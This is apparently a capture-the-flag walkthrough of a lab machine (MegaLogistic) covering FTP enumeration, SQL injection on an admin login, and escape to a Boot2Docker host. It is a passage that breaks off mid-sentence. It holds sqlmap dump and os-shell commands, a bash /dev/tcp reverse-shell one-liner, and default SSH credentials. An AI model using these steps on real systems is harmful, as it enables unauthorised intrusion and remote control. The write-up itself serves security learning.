1, port scan and web-content enumerate
21/tcp ftp `ftp-anon: Anonymous FTP login allowed`
22/tcp ssh
135/tcp msrpc
443/tcp ssl http
```
ssl-cert: Subject: commonName=admin.megalogistic.com/organizationName=MegaLogistic Ltd/stateOrProvinceName=Some-State/countryName=GR

So there would a sub-domain: admin.megalogistic.com
```
445/tcp SMB\
```
smbclient -L 10.10.10.236

Password for [WORKGROUP\wither]:
session setup failed: NT_STATUS_ACCESS_DENIED

There would need the creds.
```
5985/tcp http
47001/tcp http

Firstly, we can check the ftp with anonymous user.
Then we can get a file `docker-toolbox.exe`
```
file docker-toolbox.exe 

docker-toolbox.exe: PE32 executable (GUI) Intel 80386, for MS Windows, 8 sections
```

Secondly, we have got so many ports for http service, so we guess this machine would have other virtual hosts or sub-domains.

From https://admin.megalogistic.com/ There is a login page and we have get some error messages when we test the sql injection.

```
**Warning**: pg_query(): Query failed: ERROR: unterminated quoted string at or near "'admin'');" LINE 1: ...users WHERE username = 'admin' AND password = md5('admin''); ^ in **/var/www/admin/index.php** on line **10**
```

In this place we can found the password would md5 encode.
We can use sqlmap to crack the database:
```
sqlmap -r sql.request --force-ssl --batch --dbs

sqlmap -r login.request --force-ssl --batch -D public --tables

sqlmap -r login.request --force-ssl --batch -D public -T users --dump

+----------------------------------+----------+
| password                         | username |
+----------------------------------+----------+
| 4a100a85cb5ca3616dcf137918550815 | admin    |
+----------------------------------+----------+

```

Then we can use hashcat to crack the md5 hash, but sadly we can not crack it.

So let's try to exec the command by using the sqlmap:
`sqlmap -r sql.request --force-ssl --batch --os-shell`
Then we just need to make the reverse shell
`bash -c "bash -i >& /dev/tcp/10.10.14.65/443 0>&1"`

In this place, we need a full TTY.
```

python3 -c 'import pty;pty.spawn("bash")'
^Z
stty raw -echo; fg

```
Then we can get the user shell.

3, System shell
```
ifconfig

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
        RX packets 26073  bytes 5412131 (5.1 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 22764  bytes 8591773 (8.1 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 81801  bytes 18964110 (18.0 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 81801  bytes 18964110 (18.0 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
        
```

We can get a truth: this would be a container or docker.

```
Docker-Toolbox 
At this point, a bit more detail about Docker-Toolbox is necessary. The solution is deprecated, but that doesn’t mean it can’t be seen in the wild. Docker Toolbox installs VirtualBox, and creates a VM running the boot2docker Linux distribution. From it’s README:

(https://github.com/boot2docker/boot2docker#ssh-into-vm)
Boot2Docker is a lightweight Linux distribution made specifically to run Docker containers. It runs completely from RAM, is a ~45MB download and boots quickly.

At the bottom of that page, there’s information on how to SSH into the VM using the username docker and the password tcuser. I considered doing a ping sweep of the network to look for other hosts, but ping isn’t installed on this container.

I can guess that since this container is .2, the host (VM) is likely .1, and try to ssh into it. It works:
```

`ssh docker@172.17.0.1` `password: tcuser`

Then we can get the root shell of docker machine
Enumerate the versions and os-release
```
root@box:/home/docker# cat /etc/os-release                                     
NAME=Boot2Docker
VERSION=19.03.5
ID=boot2docker
ID_LIKE=tcl
VERSION_ID=19.03.5
PRETTY_NAME="Boot2Docker 19.03.5 (TCL 10.1)"
ANSI_COLOR="1;34"
HOME_URL="https://github.com/boot2docker/boot2docker"
SUPPORT_URL="https://blog.docker.com/2016/11/introducing-docker-community-directory-docker-community-slack/"
BUG_REPORT_URL="https://github.com/boot2docker/boot2docker/issues"
```

There’s an interesting folder at the system root, c
It looks like it has mounted the Users directory, which is standard in a Windows system


